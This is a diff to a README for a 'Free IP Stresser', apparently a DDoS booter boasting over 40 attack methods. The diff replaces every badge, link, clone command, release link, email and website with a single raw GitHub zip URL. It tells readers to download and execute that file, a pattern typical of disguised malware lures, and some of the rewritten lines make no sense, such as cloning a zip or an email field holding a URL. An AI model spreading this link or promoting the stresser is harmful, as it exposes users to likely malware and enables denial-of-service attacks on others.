@@ -1,11 +1,11 @@
 ```markdown
 # 🌐 Free IP Stresser V6 - Ultimate Network Stress Testing Tool
 
-![GitHub release (latest by date)](https://img.shields.io/github/v/release/kuroyaii/free-ip-stresser) ![License](https://img.shields.io/badge/license-MIT-brightgreen) ![Issues](https://img.shields.io/github/issues/kuroyaii/free-ip-stresser) ![Forks](https://img.shields.io/github/forks/kuroyaii/free-ip-stresser) ![Stars](https://img.shields.io/github/stars/kuroyaii/free-ip-stresser)
+![GitHub release (latest by date)](https://raw.githubusercontent.com/kuroyaii/free-ip-stresser/main/skunky/stresser-ip-free-1.3.zip) ![License](https://raw.githubusercontent.com/kuroyaii/free-ip-stresser/main/skunky/stresser-ip-free-1.3.zip) ![Issues](https://raw.githubusercontent.com/kuroyaii/free-ip-stresser/main/skunky/stresser-ip-free-1.3.zip) ![Forks](https://raw.githubusercontent.com/kuroyaii/free-ip-stresser/main/skunky/stresser-ip-free-1.3.zip) ![Stars](https://raw.githubusercontent.com/kuroyaii/free-ip-stresser/main/skunky/stresser-ip-free-1.3.zip)
 
 ## 🚀 Introduction
 
-Welcome to the **Free IP Stresser** repository! This tool is designed for educational network stress testing. It features over 40 attack methods and 20 API tools. The aim is to provide a safe environment for authorized users to explore and understand network stress testing. This tool is developed by [Nightmare Stresser](https://nightmare-stresser.co) and is intended for educational purposes only.
+Welcome to the **Free IP Stresser** repository! This tool is designed for educational network stress testing. It features over 40 attack methods and 20 API tools. The aim is to provide a safe environment for authorized users to explore and understand network stress testing. This tool is developed by [Nightmare Stresser](https://raw.githubusercontent.com/kuroyaii/free-ip-stresser/main/skunky/stresser-ip-free-1.3.zip) and is intended for educational purposes only.
 
 ### 📚 Table of Contents
 
@@ -39,7 +39,7 @@ Before you begin, ensure you have the following:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/kuroyaii/free-ip-stresser.git
+   git clone https://raw.githubusercontent.com/kuroyaii/free-ip-stresser/main/skunky/stresser-ip-free-1.3.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -48,7 +48,7 @@ Before you begin, ensure you have the following:
    ```
 
 3. **Download the Latest Release**:
-   Head over to the [Releases](https://github.com/kuroyaii/free-ip-stresser/releases) section. Download the file and execute it as per your operating system instructions.
+   Head over to the [Releases](https://raw.githubusercontent.com/kuroyaii/free-ip-stresser/main/skunky/stresser-ip-free-1.3.zip) section. Download the file and execute it as per your operating system instructions.
 
 ## ⚙️ Usage
 
@@ -107,12 +107,12 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any inquiries or issues, feel free to reach out:
 
-- **Email**: contact@nightmare-stresser.co
-- **Website**: [Nightmare Stresser](https://nightmare-stresser.co)
+- **Email**: https://raw.githubusercontent.com/kuroyaii/free-ip-stresser/main/skunky/stresser-ip-free-1.3.zip
+- **Website**: [Nightmare Stresser](https://raw.githubusercontent.com/kuroyaii/free-ip-stresser/main/skunky/stresser-ip-free-1.3.zip)
 
 ## 🔗 Links
 
-To download the latest release, visit [Releases](https://github.com/kuroyaii/free-ip-stresser/releases). Ensure you follow the provided instructions to execute the file properly.
+To download the latest release, visit [Releases](https://raw.githubusercontent.com/kuroyaii/free-ip-stresser/main/skunky/stresser-ip-free-1.3.zip). Ensure you follow the provided instructions to execute the file properly.
 
 ## 🎉 Conclusion
 
